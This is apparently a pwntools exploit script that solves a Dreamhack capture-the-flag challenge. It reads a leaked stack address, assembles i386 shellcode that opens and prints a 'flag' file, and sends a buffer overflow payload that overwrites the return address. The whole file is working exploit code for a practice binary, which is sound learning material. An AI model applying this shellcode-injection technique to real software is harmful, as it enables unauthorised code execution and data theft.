#!/usr/bin/env python3
from pwn import *

context.arch = "i386"
context.os = "linux"

r = remote("host1.dreamhack.games", 12849)
#r = process("./basic_exploitation_000", stdin=PTY)

r.recvuntil(b'buf = ')
data = r.recvlineS(keepends=False)
data = data[1:-1] # data = f"({addr})"
addr = int(data, 16)

print(f"Found addr: {hex(addr)}")

asm_shell = """
call code
.asciz "flag"
code:
pop ebx
xor ecx, ecx
mov eax, 5
int 0x80

mov ebx, 1
mov ecx, eax
xor edx, edx
mov esi, 100
mov eax, 187
int 0x80
"""

shellcode = asm(asm_shell)

# Scanf will halt on the following chars
bad_chars = {b'\x09', b'\x0a', b'\x0b', b'\x0c', b'\x0d', b'\x20'}
for c in bad_chars:
	if c in shellcode:
		print("Found bad char(s) in shellcode. Reassembling...")
		shellcode = encoders.i386.ascii_shellcode.encode(shellcode, bad_chars)
		break

payload = shellcode.ljust(0x80, b'A')
payload += b'B' * 4 #overwrite ebp
payload += p32(addr) # overwrite ret addr
payload = payload.ljust(140, b'C')

print(disasm(shellcode))
print(f"len = {len(payload)}")

r.sendline(payload)
print(r.recvall())
#r.interactive()
